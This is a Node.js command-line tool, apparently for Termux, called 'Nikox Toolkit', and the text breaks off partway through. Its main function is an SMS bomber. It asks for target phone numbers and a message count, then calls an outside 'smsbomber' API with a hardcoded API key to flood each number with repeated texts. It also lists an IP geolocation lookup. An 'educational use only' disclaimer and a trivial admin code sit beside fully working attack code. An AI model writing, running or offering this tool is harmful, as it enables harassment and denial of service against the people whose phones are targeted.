nikoxsmsbomb.js
#!/usr/bin/env node

const axios = require("axios");
const readline = require("readline");
const fs = require("fs");
const gradient = require("gradient-string");
const { execSync } = require("child_process");

const SMS_API_KEY = "8672951c715e5945e70b9da2663e3bbc2a3e7c678738a094057e3117c3a699ea";
const SMS_API_URL = "https://haji-mix-api.gleeze.com/api/smsbomber";
const IPAPI_URL = "https://ipapi.co";
const LOG_FILE = "nikox-log.txt";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let stopped = false;

// Handle Ctrl+C
process.on("SIGINT", () => {
  console.log("\n🛑 Interrupted. Exiting...");
  rl.close();
  process.exit(0);
});

function logToFile(text) {
  const time = new Date().toLocaleString();
  fs.appendFileSync(LOG_FILE, `[${time}] ${text}\n`, "utf8");
}

function vibrate() {
  try {
    execSync("termux-vibrate -d 150");
  } catch {
    console.warn("⚠️ Vibration skipped (Termux:API not available).");
  }
}

function adminCheck(callback) {
  rl.question("🔐 Admin Code Required: ", (code) => {
    const ADMIN_CODE = "2025";
    if (code === ADMIN_CODE) {
      console.log("✅ Access granted.\n");
      callback();
    } else {
      console.log("❌ Access denied. Returning to menu...");
      setTimeout(showMenu, 1500);
    }
  });
}

function showMenu() {
  if (stopped) return;
  console.clear();
  const line = "═".repeat(52);
  const center = (text) => {
    const pad = Math.max(0, Math.floor((line.length - text.length) / 2));
    return " ".repeat(pad) + text;
  };

  const title = gradient.rainbow("NIKOX TOOLKIT v1.0 (CLI)");

  console.log(`
\x1b[32m╔${line}╗
║${center(title)}║
╚${line}╝

[1] SMS Bomber
    • Attack target number(s) with repeated SMS

[2] IP Logger
    • Lookup geolocation and ISP details

[3] About
    • Developer info, platform, and credits

[0] Exit
    • Exit the Nikox Toolkit CLI

════════════════════════════════════════════════
👉 Choose an option:\x1b[0m
  `);

  rl.question("> ", handleMenu);
}

async function handleMenu(choice) {
  if (choice === "1") return adminCheck(startSmsBomber);
  if (choice === "2") return startIpLogger();
  if (choice === "3") return showAbout();
  if (choice === "0") return exitApp();
  console.log("❌ Invalid option.");
  setTimeout(showMenu, 1000);
}

// ✅ FIXED SMS BOMBER
async function startSmsBomber() {
  if (stopped) return;
  console.clear();
  const header = gradient.pastel.multiline(`
═════════════════════════════════════════════════════
   SMS BOMBER — Terminal v1.0
   By Angel Nico Igdalino
═════════════════════════════════════════════════════`);
  console.log(header);

  const subtitle = gradient.atlas(`
🧾 Description:
   This tool attacks target phone(s) by sending repeated SMS.
⚠️  Educational use only — do not misuse!

📥 INPUT REQUIRED:
`);
  console.log(subtitle);

  rl.question("Enter target number(s) [comma-separated]: ", (input) => {
    if (stopped) return;
    rl.question("Enter amount of SMS per number: ", async (amt) => {
      if (stopped) return;
      const phones = input.split(",").map(p => p.trim()).filter(Boolean);
      const amount = parseInt(amt);
      if (!phones.length || isNaN(amount) || amount <= 0) {
        console.log("❌ Invalid input.");
        return rl.question("\n⏎ Press Enter to return to menu...", showMenu);
      }

      let success = 0, failed = 0;
      const total = phones.length;
      console.log(`\n📲 Launching SMS attack on ${total} number(s)...\n`);

      for (let i = 0; i < total; i++) {
        if (stopped) return;
        const phone = phones[i];
        process.stdout.write(`📤 Sending to ${phone} (${i + 1}/${total})... `);

        try {
          const res = await axios.get(SMS_API_URL, {
            params: { phone, amount, api_key: SMS_API_KEY }
          });

          const { status, message, details } = res.data;

          if (status) {
            success++;
            console.log(`✅ ${details.total_success} sent, ${details.total_failed} failed`);
            logToFile(`SMS Bombed ${phone} — ${details.total_success} success, ${details.total_failed} failed`);
            vibrate();
          } else {
            failed++;
            console.log("❌ " + message);
            logToFile(`❌ Failed to bomb ${phone}: ${message}`);
            vibrate();
          }
        } catch (err) {
          failed++;
          console.log("❌ Error: " + err.message);
          logToFile(`❌ Bombing error for ${phone}: ${err.message}`);
          vibrate();
        }

        const percent = Math.floor(((i + 1) / total) * 100);
        const barSize = 30;
        const filled = Math.floor((percent / 100) * barSize);
        const progressBar = "█".repeat(filled) + "░".repeat(barSize - filled);
        console.log(gradient.pastel(`📊 Progress: [${progressBar}] ${percent}%`));
        console.log(`✅ Total Success: ${success} | ❌ Total Failed: ${failed}\n`);
      }

      if (stopped) return;
      console.log(gradient.vice(`🎉 Fin